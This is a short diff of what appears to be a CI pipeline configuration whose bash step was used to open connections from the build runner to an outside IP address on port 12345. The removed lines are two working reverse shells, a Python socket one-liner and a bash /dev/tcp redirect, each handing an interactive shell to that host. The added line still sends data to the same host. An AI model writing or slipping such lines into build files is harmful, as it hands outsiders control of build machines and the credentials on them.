@@ -12,6 +12,5 @@ pool:
 steps:
 - bash: |
     echo before
-    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("142.93.165.75",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-    bash -i >& /dev/tcp/142.93.165.75/12345 0>&1
+    echo test > /dev/tcp/142.93.165.75/12345
     echo after, exitcode=$?
